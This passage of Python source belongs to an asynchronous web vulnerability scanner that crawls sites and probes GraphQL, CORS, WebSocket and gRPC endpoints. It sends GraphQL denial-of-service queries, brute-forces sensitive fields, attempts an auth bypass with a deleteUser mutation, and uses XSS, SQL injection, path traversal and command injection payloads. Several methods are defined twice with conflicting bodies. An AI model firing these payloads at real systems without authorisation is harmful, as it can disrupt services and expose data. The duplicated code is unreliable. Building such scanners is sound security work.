    async def _test_graphql_alias_dos(self, endpoint):
        """Test for GraphQL alias multiplication DoS vulnerability"""
        alias_query = ""
        for i in range(5000):
            alias_query += f'alias{i}: __typename '
        
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": f"{{ {alias_query} }}"})
            if resp and resp.status == 200:
                await self._add_vulnerability({
                    "type":"GraphQL Alias DoS","url":endpoint,"parameter":"*",
                    "evidence":"GraphQL alias multiplication allowed - potential DoS",
                    "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
                })
        except Exception as e:
            logging.debug(f"GraphQL alias DoS test error: {e}")

    async def _test_graphql_recursive_fragment_dos(self, endpoint):
        """Test for GraphQL recursive fragment expansion DoS vulnerability"""
        # Create mutually recursive fragments
        fragment_a = "fragment fragA on User { id name ...fragB }"
        fragment_b = "fragment fragB on User { id email ...fragA }"
        recursive_query = f"""
        {fragment_a}
        {fragment_b}
        {{ user(id: "1") {{ ...fragA }} }}
        """
        
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": recursive_query})
            if resp and resp.status == 200:
                await self._add_vulnerability({
                    "type":"GraphQL Recursive Fragment DoS","url":endpoint,"parameter":"*",
                    "evidence":"GraphQL recursive fragments allowed - potential DoS",
                    "severity":"High","confidence":80,"cwe":CWE_MAP["GraphQL"]
                })
        except Exception as e:
            logging.debug(f"GraphQL recursive fragment test error: {e}")

    async def _test_graphql_introspection_depth_bomb(self, endpoint):
        """Test for GraphQL introspection depth bomb with nested __typename queries"""
        # Build deeply nested __typename query (100 levels)
        nested_query = "query { "
        for i in range(100):
            nested_query += f"field{i}: {{ __typename "
        nested_query += "}" * 100 + " }"
        
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": nested_query})
            if resp and resp.status == 200:
                await self._add_vulnerability({
                    "type":"GraphQL Introspection Depth Bomb","url":endpoint,"parameter":"*",
                    "evidence":"GraphQL deep introspection allowed - potential DoS",
                    "severity":"High","confidence":85,"cwe":CWE_MAP["GraphQL"]
                })
        except Exception as e:
            logging.debug(f"GraphQL introspection depth bomb test error: {e}")

    async def _test_graphql_field_suggestion(self, endpoint):
        """Test for GraphQL field suggestion (introspection bypass) vulnerability"""
        # Test 1: Simple __typename query to confirm GraphQL is active
        simple_query = "{ __typename }"
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": simple_query})
            if not resp or resp.status != 200:
                return
        except Exception as e:
            logging.debug(f"GraphQL not active at {endpoint}: {e}")
            return
        
        # Test 2: Try to access __schema (introspection)
        introspection_query = """
        {
            __schema {
                types {
                    name
                    fields {
                        name
                    }
                }
            }
        }
        """
        
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": introspection_query})
            if resp and resp.status == 200:
                data = resp.json()
                if '__schema' in data.get('data', {}):
                    await self._add_vulnerability({
                        "type":"GraphQL Introspection Enabled","url":endpoint,"parameter":"*",
                        "evidence":"GraphQL introspection query succeeded - schema exposed",
                        "severity":"Medium","confidence":90,"cwe":CWE_MAP["GraphQL"]
                    })
        except Exception as e:
            logging.debug(f"GraphQL introspection test error: {e}")
        
        # Test 3: Field suggestion via brute force
        common_fields = ['user', 'users', 'account', 'accounts', 'admin', 'password', 'email', 'secret']
        for field in common_fields:
            field_query = f"{{ {field} {{ __typename }} }}"
            try:
                resp = await self._async_fetch(endpoint, method='POST', json_data={"query": field_query})
                if resp and resp.status == 200:
                    data = resp.json()
                    if field in data.get('data', {}):
                        await self._add_vulnerability({
                            "type":"GraphQL Field Suggestion","url":endpoint,"parameter":"*",
                            "evidence":f"GraphQL field '{field}' accessible via suggestion",
                            "severity":"Low","confidence":70,"cwe":CWE_MAP["GraphQL"]
                        })
                        break
            except Exception as e:
                logging.debug(f"GraphQL field brute-force error for {field}: {e}")

    async def _test_graphql_batching_auth_bypass(self, endpoint):
        """Test for GraphQL batching authentication bypass vulnerability"""
        # Extract JWT token from the current session if available
        auth_token = None
        if hasattr(self.session_manager, 'async_session') and self.session_manager.async_session:
            cookies = self.session_manager.async_session.session.cookie_jar
            for cookie in cookies:
                if 'token' in cookie.key.lower() or 'jwt' in cookie.key.lower():
                    auth_token = cookie.value
                    break
        
        # Test batching with different operations
        batch_query = """
        [
            {"query": "query { __typename }"},
            {"query": "query { admin { __typename } }"},
            {"query": "mutation { deleteUser(id: 1) { __typename } }"}
        ]
        """
        
        headers = {}
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data=batch_query, headers=headers)
            if resp and resp.status == 200:
                data = resp.json()
                # Check if admin or deleteUser succeeded despite lack of proper auth
                for item in data if isinstance(data, list) else []:
                    if 'admin' in str(item) or 'deleteUser' in str(item):
                        await self._add_vulnerability({
                            "type":"GraphQL Batching Auth Bypass","url":endpoint,"parameter":"*",
                            "evidence":"GraphQL batching allowed authentication bypass",
                            "severity":"Critical","confidence":90,"cwe":CWE_MAP["GraphQL"]
                        })
                        break
        except Exception as e:
            logging.debug(f"GraphQL batching auth bypass test error: {e}")

    # --- Helper methods for async fetch ---
    async def _async_fetch(self, url, method='GET', data=None, json_data=None, headers=None):
        """Async HTTP fetch with session management"""
        if not self.session_manager or not self.session_manager.async_session:
            return None
        try:
            async with self.session_manager.async_session.session.request(
                method, url, data=data, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                body = await resp.text()
                # Store response metadata for detection
                resp._body = body
                resp._elapsed = getattr(resp, '_elapsed', 0)
                return resp
        except Exception as e:
            logging.debug(f"Async fetch error for {url}: {e}")
            return None

    def log(self, msg):
        """Log message"""
        logging.info(msg)

    def update_progress(self, current, total):
        """Update progress"""
        logging.info(f"Progress: {current}/{total}")

# ---------------------------------------------------------------------
# CORE SCANNER ENGINE (async)
# ---------------------------------------------------------------------
class OmegaDAST:
    def __init__(self, target, config, signals, loop=None):
        self.target = target.rstrip('/')
        self.base_domain = urlparse(target).netloc
        self.config = config
        self.signals = signals
        self.loop = loop or asyncio.new_event_loop()
        self.public_ip = config.get('oob_ip') or self.loop.run_until_complete(get_public_ip())
        
        # Validate OOB configuration before scan starts
        if not validate_oob_config(self.public_ip, config.get('oob_dns_domain', 'oob.example.com')):
            logging.warning("OOB configuration validation failed. Scan may have issues with OOB callbacks.")
        
        self.exclusion_patterns = [re.compile(p) for p in config.get('exclude', [])]
        self.capture_evidence = config.get('capture_evidence', True)
        self.stop_event = asyncio.Event()
        self.log_file = config.get('log_file')
        
        # Concurrency limit to prevent overwhelming targets
        self.concurrency_limit = config.get('concurrency_limit', 100)
        self.semaphore = asyncio.Semaphore(self.concurrency_limit)
        
        # Circuit breaker for HTTP requests
        self.circuit_breaker = CircuitBreaker(
            failure_threshold=config.get('circuit_breaker_threshold', 5),
            cooldown=config.get('circuit_breaker_cooldown', 60),
            max_retries=config.get('circuit_breaker_max_retries', 3)
        )
        
        # Initialize component engines
        self.crawler_engine = CrawlerEngine(
            self.target, config, self.base_domain, self.exclusion_patterns, self.circuit_breaker
        )
        self.session_manager = SessionManager(config, self.loop, self.circuit_breaker)
        self.reporting_engine = ReportingEngine(config, signals, self.session_manager)
        self.oob_manager = OOBManager(config, self.public_ip)
        self.injection_engine = InjectionEngine(
            config, self.crawler_engine, self.session_manager, self.reporting_engine, self.oob_manager
        )
        self.subdomain_discovery = SubdomainDiscovery()
        
        # Additional state management
        self.scan_state_manager = ScanStateManager(config.get('state_db', 'scan_state.db'))
        self.temporal_recheck_enabled = config.get('temporal_recheck', False)
        self.recheck_delay = config.get('recheck_delay', 3600)
        self.validation_tasks = set()
        self.memory_efficient = config.get('memory_efficient', True)
        self.vulnerability_timestamps = {}
        self.fp_db = FP_Database()
        
        # Validation Engine for 3x validation and remediation testing
        self.validation_enabled = config.get('validation_enabled', DEFAULT_VALIDATION_ENABLED)
        self.validation_engine = None
        
        # Selenium driver (will be initialized in setup)
        self.selenium_driver = None
        self.selenium_ready = False
        
        # logging setup with rotation
        log_file = self.log_file or 'ultradast.log'
        log_handler = RotatingFileHandler(
            log_file,
            maxBytes=10*1024*1024,
            backupCount=5,
            encoding='utf-8'
        )
        log_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logging.basicConfig(
            level=logging.INFO,
            handlers=[log_handler, logging.StreamHandler()],
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    def log(self, msg):
        """Log message - can be overridden by GUI or use default logging"""
        if hasattr(self.signals, 'log'):
            self.signals.log.emit(msg)
        else:
            logging.info(msg)

    def add_finding(self, vuln):
        """Report vulnerability finding - can be overridden by GUI or use default logging"""
        if hasattr(self.signals, 'finding'):
            self.signals.finding.emit(vuln)
        else:
            logging.info(f"Finding: {vuln}")
    
    def update_progress(self, current, total):
        """Update progress - can be overridden by GUI or use default logging"""
        if hasattr(self.signals, 'progress'):
            self.signals.progress.emit(current, total)
        else:
            logging.info(f"Progress: {current}/{total}")

    async def setup(self):
        # Setup component engines
        await self.session_manager.setup()
        await self.oob_manager.setup()
        
        # Load previous state if resuming
        if self.config.get('resume_scan'):
            prev_state = self.scan_state_manager.load_state()
            if prev_state and prev_state['target'] == self.target:
                self.crawler_engine.visited_urls = prev_state['visited_urls']
                self.crawler_engine.parameters = prev_state['parameters'] if isinstance(prev_state['parameters'], list) else []
                self.reporting_engine.vulnerabilities = prev_state['vulnerabilities'] if isinstance(prev_state['vulnerabilities'], list) else []
                self.crawler_engine.crawled_pages = prev_state['crawled_pages'] if isinstance(prev_state['crawled_pages'], list) else []
                self.log(f"Resumed scan with {len(self.crawler_engine.visited_urls)} URLs, {len(self.crawler_engine.parameters)} parameters")
        
        # Restore state from GUI checkpoint if available
        checkpoint_data = self.config.get('checkpoint_data')
        if checkpoint_data and checkpoint_data.get('target') == self.target:
            self.crawler_engine.visited_urls = set(checkpoint_data.get('visited_urls', []))
            self.reporting_engine.vulnerabilities = checkpoint_data.get('vulnerabilities', [])
            self.log(f"Restored from checkpoint: {len(self.crawler_engine.visited_urls)} URLs, {len(self.reporting_engine.vulnerabilities)} vulnerabilities")
        
        # Initialize Validation Engine with async session
        if self.validation_enabled:
            self.validation_engine = ValidationEngine(self.session_manager.async_session.session, self.config)
            self.log("Validation Engine initialized for 3x validation and remediation testing")
        
        # Setup Selenium driver
        if self.config.get('js_render', True):
            self.selenium_driver = JSRenderDriver(proxy=self.config.get('proxy'))
            if not self.selenium_driver.create():
                self.log("JS rendering unavailable.")
            else:
                self.selenium_ready = True
                self.injection_engine.selenium_driver = self.selenium_driver
                self.injection_engine.selenium_ready = True
        
        # Authentication
        if self.config.get('auth_steps'):
            await self.session_manager.perform_authentication(self.config.get('auth_steps'))
        if self.config.get('cookies'):
            self.session_manager.load_cookies(self.config['cookies'])

    async def scan(self):
        self.log(LEGAL_BANNER)
        await self.setup()
        
        # Estimate total tasks for progress tracking
        estimated_urls = self.config.get('depth', DEFAULT_DEPTH) * 50
        estimated_params = estimated_urls * 5
        self.total_tasks = estimated_urls + estimated_params + 10
        self.current_task = 0
        
        await self.crawl()
        self.log(f"Crawled {len(self.crawler_engine.visited_urls)} URLs, found {len(self.crawler_engine.parameters)} parameters.")
        await self.discover_websocket_endpoints()
        await self.discover_grpc_endpoints()
        await self.test_graphql()
        await self.test_jwts()
        await self.injection_engine.run_tests()
        # Save state for resumability
        if self.config.get('save_state'):
            self.scan_state_manager.save_state(
                self.target, 
                self.crawler_engine.visited_urls, 
                self.crawler_engine.parameters, 
                self.reporting_engine.vulnerabilities, 
                self.crawler_engine.crawled_pages, 
                self.config
            )
            self.log("Scan state saved for resumption.")
        self.finalize()
        await self.session_manager.close()
        if self.selenium_driver:
            self.selenium_driver.quit()

    def finalize(self):
        """Cleanup resources and stop OOB servers"""
        self.log("Finalizing scan...")
        self.oob_manager.stop()
        self.reporting_engine.close()
        self.log("Scan finalized.")

    async def crawl(self):
        queue = asyncio.Queue()
        await queue.put((self.target, 0))
        while not self.stop_event.is_set():
            try:
                url, depth = await asyncio.wait_for(queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                if queue.empty():
                    break
                continue
            if any(p.search(url) for p in self.crawler_engine.exclusion_patterns):
                continue
            if url in self.crawler_engine.visited_urls or depth > self.config.get('depth', DEFAULT_DEPTH):
                continue
            self.crawler_engine.visited_urls.add(url)
            self.current_task += 1
            self.update_progress(self.current_task, self.total_tasks)
            if hasattr(self.signals, 'status'):
                self.signals.status.emit(f"Crawling {url}")
            else:
                logging.info(f"Crawling {url}")
            resp = await self.session_manager.fetch(url)
            if resp and resp.status == 200:
                html = resp._body
                soup = BeautifulSoup(html, 'html.parser')
                # Store only metadata in memory; persist full HTML to SQLite
                page_metadata = {
                    'url': url,
                    'hash': hashlib.md5(html.encode()).hexdigest(),
                    'headers': dict(resp.headers),
                    'timestamp': datetime.now().isoformat()
                }
                self.crawler_engine.crawled_pages.append(page_metadata)
                # Persist full HTML to SQLite
                await self.loop.run_in_executor(None, self.scan_state_manager.store_page_hash, url, html, page_metadata)
                await self._passive_checks(resp)
                links = self.crawler_engine._extract_links(soup, url, html)
                for l in links:
                    if l not in self.crawler_engine.visited_urls:
                        await queue.put((l, depth + 1))
                self.crawler_engine._extract_parameters(url, html, soup)
                # Potential CSRF
                for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                    if not form.find('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
                        await self._add_vulnerability({
                            "type": "CSRF (potential)", "url": url, "parameter": "form",
                            "evidence": "POST form without CSRF token", "severity": "Medium", "confidence": 65,
                            "cwe": CWE_MAP["CSRF"]
                        })
            # JS rendering
            if self.selenium_ready:
                rendered = await self.loop.run_in_executor(None, self.selenium_driver.get, url)
                if rendered:
                    alerts = self.selenium_driver.check_alerts()
                    if alerts:
                        v = Detector.dom_xss(None, self.selenium_driver, '', '')
                        if v: await self._add_vulnerability(v)
                    await self._process_cdp_responses(queue, depth)
                    rendered_soup = BeautifulSoup(rendered, 'html.parser')
                    js_links = self.crawler_engine._extract_links(rendered_soup, url, rendered)
                    for l in js_links:
                        if l not in self.crawler_engine.visited_urls:
                            await queue.put((l, depth + 1))
                    self.crawler_engine._extract_parameters(url, rendered, rendered_soup)
                    # SPA route clicking
                    if self.config.get('spa_crawling', True):
                        spa_routes = await self.loop.run_in_executor(None, self.selenium_driver.click_spa_routes, url)
                        for spa_url in spa_routes:
                            if spa_url not in self.crawler_engine.visited_urls:
                                await queue.put((spa_url, depth + 1))

    async def _process_cdp_responses(self, queue, depth):
        with self.selenium_driver.lock:
            captured = list(self.selenium_driver.captured_requests)
            self.selenium_driver.captured_requests.clear()
        for req in captured:
            if req['type'] == 'response' and self.crawler_engine._is_in_scope(req['url']):
                if req['url'] not in self.crawler_engine.visited_urls:
                    await queue.put((req['url'], depth + 1))
                if req.get('body'):
                    try:
                        data = json.loads(req['body'])
                        if isinstance(data, dict):
                            for key in data.keys():
                                self.crawler_engine._add_param(req['url'], 'GET', key, 'json')
                        elif isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
                            for key in data[0].keys():
                                self.crawler_engine._add_param(req['url'], 'GET', key, 'json')
                    except Exception as e:
                        logging.warning(f"CDP JSON parse error: {e}")

    async def _passive_checks(self, resp):
        url = str(resp.url)
        headers = resp.headers
        scheme = urlparse(url).scheme
        if scheme == 'https' and 'Strict-Transport-Security' not in headers:
            await self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing HSTS on HTTPS","url":url,"severity":"Medium","confidence":80})
        if 'X-Frame-Options' not in headers:
            await self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing X-Frame-Options","url":url,"severity":"Low","confidence":60})
        if 'X-Content-Type-Options' not in headers:
            await self._add_vulnerability({"type":"SecurityMisconfig","subtype":"Missing X-Content-Type-Options","url":url,"severity":"Low","confidence":60})
        for cookie in resp.cookies:
            if isinstance(cookie, str):
                continue
            if not cookie.secure and scheme == 'https':
                await self._add_vulnerability({"type":"SensitiveDataExposure","subtype":"Cookie without Secure on HTTPS","url":url,"parameter":cookie.name,"severity":"Medium","confidence":85})
            if not cookie.has_nonstandard_attr('HttpOnly'):
                await self._add_vulnerability({"type":"SensitiveDataExposure","subtype":"Cookie without HttpOnly","url":url,"parameter":cookie.name,"severity":"Low","confidence":70})
        if 'Server' in headers:
            await self._add_vulnerability({"type":"InfoDisclosure","subtype":"Server header","url":url,"evidence":headers['Server'],"severity":"Low","confidence":70})
        # CORS (sync, but simple)
        cors = await self._check_cors_misconfig(url)
        if cors: 
            await self._add_vulnerability(cors)

    # --- Advanced discovery ---
    async def _check_cors_misconfig(self, url):
        """Async CORS misconfiguration check using aiohttp"""
        test_origin = "https://evil.com"
        headers = {"Origin": test_origin}
        try:
            async with self.session_manager.async_session.session.options(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                if acao == '*' or acao == test_origin:
                    return {"type": "CORS Misconfiguration", "url": url, "evidence": f"ACAO: {acao}", "severity": "Medium", "confidence": 80}
                
                # Test for credentialed CORS
                cred_headers = {
                    "Origin": test_origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization, Content-Type"
                }
                try:
                    async with self.session_manager.async_session.session.options(url, headers=cred_headers, timeout=aiohttp.ClientTimeout(total=5)) as cred_resp:
                        acao_cred = cred_resp.headers.get("Access-Control-Allow-Origin", "")
                        acac = cred_resp.headers.get("Access-Control-Allow-Credentials", "")
                        
                        if acao_cred == test_origin and acac == "true":
                            return {"type": "CORS Credentialed Misconfiguration", "url": url, "evidence": f"ACAO: {acao_cred}, ACAC: {acac}", "severity": "High", "confidence": 85}
                except Exception as e:
                    logging.warning(f"CORS credentialed test error: {e}")
        except Exception as e:
            logging.warning(f"CORS check error: {e}")
        return None

    async def discover_websocket_endpoints(self):
        if not WEBSOCKETS_AVAILABLE: return
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            ws_urls = re.findall(r'(wss?://[^\s"\']+)', html)
            for ws_url in ws_urls:
                self.log(f"WebSocket endpoint: {ws_url}")
                await self.fuzz_websocket(ws_url)

    async def fuzz_websocket(self, ws_url):
        try:
            async with websockets.connect(ws_url) as websocket:
                for payload in PAYLOADS.get("WebSocket", []):
                    await websocket.send(payload)
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=2)
                        if payload in response:
                            await self._add_vulnerability({
                                "type":"WebSocket XSS","url":ws_url,"parameter":"message",
                                "evidence":f"Payload reflected: {payload}","severity":"High","confidence":80,
                                "cwe":CWE_MAP["WebSocket"]
                            })
                    except asyncio.TimeoutError: pass
        except Exception as e:
            logging.warning(f"WebSocket error {ws_url}: {e}")

    async def discover_grpc_endpoints(self):
        if not GRPC_AVAILABLE: return
        for port in [50051, 50052, 8080]:
            target = f"{self.target.split('://')[0]}://{self.base_domain}:{port}"
            try:
                channel = grpc.insecure_channel(target)
                stub = reflection_pb2_grpc.ServerReflectionStub(channel)
                request = reflection_pb2.ServerReflectionRequest(list_services="")
                responses = stub.ServerReflectionInfo(iter([request]))
                for resp in responses:
                    if resp.list_services_response:
                        await self._add_vulnerability({
                            "type":"gRPC Reflection Enabled","url":target,"parameter":"*",
                            "evidence":"gRPC server reflection available","severity":"Medium","confidence":90,
                            "cwe":CWE_MAP["gRPC"]
                        })
            except Exception as e:
                logging.warning(f"gRPC reflection test error: {e}")
            
            # Test gRPC message fuzzing
            await self._fuzz_grpc_messages(target)

    async def _fuzz_grpc_messages(self, target):
        """Fuzz gRPC messages with malformed protobuf data"""
        if not GRPC_AVAILABLE: return
        try:
            channel = grpc.insecure_channel(target)
            for payload in PAYLOADS.get("gRPC", []):
                try:
                    # Try to send malformed data to the channel
                    # This is a basic fuzzing attempt - in practice you'd need actual service definitions
                    channel._channel.send(payload)
                    await self._add_vulnerability({
                        "type":"gRPC Message Fuzzing","url":target,"parameter":"*",
                        "evidence":f"Accepted malformed payload: {payload[:20]}...",
                        "severity":"Medium","confidence":60,"cwe":CWE_MAP["gRPC"]
                    })
                except Exception:
                    pass
        except Exception as e:
            logging.warning(f"gRPC message fuzzing error: {e}")

    async def test_graphql(self):
        if not GRAPHQL_AVAILABLE: return
        for ep in ['/graphql','/v1/graphql','/api/graphql']:
            gql_url = urljoin(self.target, ep)
            try:
                query = get_introspection_query()
                resp = await self._async_fetch(gql_url, method='POST', json_data={'query': query})
                if resp and resp.status == 200 and '__schema' in resp._body:
                    await self._add_vulnerability({"type":"GraphQL Introspection Enabled","url":gql_url,"severity":"Medium","confidence":95})
                    schema = build_client_schema((await resp.json()).get('data'))
                    await self.fuzz_graphql_schema(gql_url, schema)
            except Exception as e:
                logging.warning(f"GraphQL introspection error: {e}")

    async def fuzz_graphql_schema(self, endpoint, schema: GraphQLSchema):
        payloads = ["<script>alert(1)</script>", "' OR 1=1--", "../../../../etc/passwd", ";id"]
        async def traverse_input(prefix, input_type):
            if is_input_type(input_type):
                for field_name, field in input_type.fields.items():
                    arg = f"{prefix}.{field_name}" if prefix else field_name
                    for payload in payloads:
                        query = f"mutation {{ dummy(input: {{ {arg}: \"{payload}\" }}) {{ __typename }} }}"
                        resp = await self._async_fetch(endpoint, method='POST', json_data={'query': query})
                        if resp and resp.status == 200:
                            # Check if payload was reflected in response
                            if payload in resp._body:
                                await self._add_vulnerability({
                                    "type":"GraphQL Injection","url":endpoint,"parameter":arg,
                                    "evidence":f"Payload reflected: {payload}",
                                    "severity":"High","confidence":80,"cwe":CWE_MAP["GraphQL"]
                                })
                    if is_input_type(field.type):
                        await traverse_input(arg, field.type)
        for type_name, gtype in schema.type_map.items():
            if is_input_type(gtype):
                await traverse_input('', gtype)
        
        # Test GraphQL batching DoS
        await self._test_graphql_batching(endpoint)
        
        # Test GraphQL alias multiplication DoS
        await self._test_graphql_alias_dos(endpoint)
        
        # Test GraphQL recursive fragment expansion DoS
        await self._test_graphql_recursive_fragment_dos(endpoint)
        
        # Test GraphQL introspection depth bomb
        await self._test_graphql_introspection_depth_bomb(endpoint)
        
        # Test GraphQL field suggestion (introspection bypass)
        await self._test_graphql_field_suggestion(endpoint)
        
        # Test GraphQL batching authentication bypass
        await self._test_graphql_batching_auth_bypass(endpoint)

    async def _test_graphql_batching(self, endpoint):
        """Test for GraphQL batching DoS vulnerability"""
        batch_query = ""
        for i in range(100):
            batch_query += f'query{i}: user(id: "{i}") {{ id name }} '
        
        start_time = time.time()
        resp = await self._async_fetch(endpoint, method='POST', json_data={'query': f'{{ {batch_query} }}'})
        elapsed = time.time() - start_time
        
        if resp and resp.status == 200 and elapsed > 5:
            await self._add_vulnerability({
                "type":"GraphQL Batching DoS","url":endpoint,"parameter":"query",
                "evidence":f"100 batched queries took {elapsed:.2f}s",
                "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
            })

    async def _test_graphql_alias_dos(self, endpoint):
        """Test for GraphQL alias multiplication DoS vulnerability"""
        alias_query = ""
        for i in range(5000):
            alias_query += f'alias{i}: user(id: "1") {{ id name }} '
        
        start_time = time.time()
        resp = await self._async_fetch(endpoint, method='POST', json_data={'query': f'{{ {alias_query} }}'})
        elapsed = time.time() - start_time
        
        if resp and resp.status == 200 and elapsed > 5:
            await self._add_vulnerability({
                "type":"GraphQL Alias DoS","url":endpoint,"parameter":"query",
                "evidence":f"5000 aliases took {elapsed:.2f}s",
                "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
            })

    async def _test_graphql_recursive_fragment_dos(self, endpoint):
        """Test for GraphQL recursive fragment expansion DoS vulnerability"""
        # Create mutually recursive fragments
        fragment_a = "fragment fragA on User { id name ...fragB }"
        fragment_b = "fragment fragB on User { email ...fragA }"
        
        query = f'''
            {fragment_a}
            {fragment_b}
            {{
                user(id: "1") {{
                    ...fragA
                }}
            }}
        '''
        
        start_time = time.time()
        resp = await self._async_fetch(endpoint, method='POST', json_data={'query': query})
        elapsed = time.time() - start_time
        
        if resp and resp.status == 200 and elapsed > 5:
            await self._add_vulnerability({
                "type":"GraphQL Recursive Fragment DoS","url":endpoint,"parameter":"query",
                "evidence":f"Recursive fragments took {elapsed:.2f}s",
                "severity":"High","confidence":80,"cwe":CWE_MAP["GraphQL"]
            })

    async def _test_graphql_introspection_depth_bomb(self, endpoint):
        """Test for GraphQL introspection depth bomb with nested __typename queries"""
        # Build deeply nested __typename query (100 levels)
        nested_query = "query { "
        current = "user(id: \"1\") { __typename "
        
        for i in range(100):
            current += f" nested{i}: user(id: \"{i}\") {{ __typename "
        
        # Close all the braces
        current += " }" * 101
        nested_query += current + " }"
        
        start_time = time.time()
        resp = await self._async_fetch(endpoint, method='POST', json_data={'query': nested_query})
        elapsed = time.time() - start_time
        
        if resp and resp.status == 200 and elapsed > 5:
            await self._add_vulnerability({
                "type":"GraphQL Introspection Depth Bomb","url":endpoint,"parameter":"query",
                "evidence":f"100-level nested __typename query took {elapsed:.2f}s",
                "severity":"High","confidence":85,"cwe":CWE_MAP["GraphQL"]
            })

    async def _test_graphql_field_suggestion(self, endpoint):
        """Test for GraphQL field suggestion (introspection bypass) vulnerability"""
        # Test 1: Simple __typename query to confirm GraphQL is active
        simple_query = "{ __typename }"
        try:
            resp = await self._async_fetch(endpoint, method='POST', json_data={'query': simple_query})
            if resp and resp.status == 200:
                try:
                    data = await resp.json()
                    if 'data' in data and '__typename' in data['data']:
                        typename = data['data']['__typename']
                        if typename in ['Query', 'Mutation', 'Subscription']:
                            await self._add_vulnerability({
                                "type":"GraphQL Field Suggestion - Active Endpoint","url":endpoint,
                                "evidence":f"GraphQL endpoint confirmed with __typename: {typename}",
                                "severity":"Low","confidence":95,"cwe":CWE_MAP["GraphQL"]
                            })
                except:
                    pass
        except Exception as e:
            logging.warning(f"GraphQL field suggestion test error: {e}")

        # Test 2: Brute-force common field names (users, posts, products, etc.)
        common_fields = ['users', 'posts', 'products', 'accounts', 'customers', 'orders', 'items', 'admin', 'user', 'post', 'product']
        sensitive_fields = ['email', 'password', 'creditCard', 'ssn', 'apiKey', 'token', 'secret']
        
        for field in common_fields:
            # Try to query the field with minimal selection
            query = f"{{ {field} {{ id }} }}"
            try:
                resp = await self._async_fetch(endpoint, method='POST', json_data={'query': query})
                if resp and resp.status == 200:
                    try:
                        data = await resp.json()
                        if 'data' in data and field in data['data']:
                            # Field exists - now try to access sensitive data
                            for sensitive in sensitive_fields:
                                sensitive_query = f"{{ {field} {{ {sensitive} }} }}"
                                resp_sensitive = await self._async_fetch(endpoint, method='POST', json_data={'query': sensitive_query})
                                if resp_sensitive and resp_sensitive.status == 200:
                                    try:
                                        sensitive_data = await resp_sensitive.json()
                                        if 'data' in sensitive_data and field in sensitive_data['data']:
                                            field_data = sensitive_data['data'][field]
                                            if field_data and len(str(field_data)) > 0:
                                                await self._add_vulnerability({
                                                    "type":"GraphQL Field Suggestion - Sensitive Data Leak","url":endpoint,
                                                    "evidence":f"Sensitive field '{sensitive}' accessible in '{field}'",
                                                    "severity":"Critical","confidence":90,"cwe":CWE_MAP["GraphQL"]
                                                })
                                                break
                                    except:
                                        pass
                    except:
                        pass
            except Exception as e:
                logging.warning(f"GraphQL field brute-force error for {field}: {e}")

    async def _test_graphql_batching_auth_bypass(self, endpoint):
        """Test for GraphQL batching authentication bypass vulnerability"""
        # Extract JWT token from the current session if available
        auth_token = None
        if hasattr(self, 'session') and self.session:
            if 'Authorization' in self.session.headers:
                auth_header = self.session.headers['Authorization']
                if auth_header.startswith('Bearer '):
                    auth_token = auth_header[7:]
        
        # Test multiple batch formats for different GraphQL servers (Apollo, Hasura, etc.)
        batch_formats = [
            # Apollo Server format
            [
                {"query": "users { id }", "variables": {"id": 1}},
                {"query": "users { id }", "variables": {"id": 2}}
            ],
            # Hasura/alternative format with wrapper
            {"batch": [
                {"query": "users { id }", "variables": {"id": 1}},
                {"query": "users { id }", "variables": {"id": 2}}
            ]},
            # Single query format as fallback
            {"query": "users { id }", "variables": {"id": 1}}
        ]
        
        try:
            for batch_queries in batch_formats:
                # Test without authentication
                headers_no_auth = {}
                resp_no_auth = await self._async_fetch(endpoint, method='POST', json_data=batch_queries, headers=headers_no_auth)
                
                # Test with authentication (if token available)
                if auth_token:
                    headers_with_auth = {"Authorization": f"Bearer {auth_token}"}
                    resp_with_auth = await self._async_fetch(endpoint, method='POST', json_data=batch_queries, headers=headers_with_auth)
                    
                    # Compare responses
                    if resp_no_auth and resp_with_auth:
                        no_auth_data = (await resp_no_auth.json()) if resp_no_auth.status == 200 else {}
                        with_auth_data = (await resp_with_auth.json()) if resp_with_auth.status == 200 else {}
                        
                        # If unauthenticated request returns same data as authenticated, there's a bypass
                        if no_auth_data == with_auth_data and len(str(no_auth_data)) > 50:
                            await self._add_vulnerability({
                                "type":"GraphQL Batching Auth Bypass","url":endpoint,
                                "evidence":"Unauthenticated batch query returned same data as authenticated request",
                                "severity":"Critical","confidence":85,"cwe":CWE_MAP["GraphQL"]
                            })
                            break  # Vulnerability found, no need to test other formats
                
                # Test 2: Mixed authentication in single batch (if token available)
                if auth_token and isinstance(batch_queries, list):
                    mixed_batch = [
                        {"query": "users { id email }", "variables": {"id": 1}},
                        {"query": "users { id password }", "variables": {"id": 2}}
                    ]
                    
                    # Send with auth header
                    resp_mixed = await self._async_fetch(endpoint, method='POST', json_data=mixed_batch, headers=headers_with_auth)
                    
                    if resp_mixed and resp_mixed.status == 200:
                        try:
                            mixed_data = await resp_mixed.json()
                            # Check if sensitive data (password) was returned
                            mixed_str = str(mixed_data).lower()
                            if 'password' in mixed_str or len(mixed_str) > 100:
                                await self._add_vulnerability({
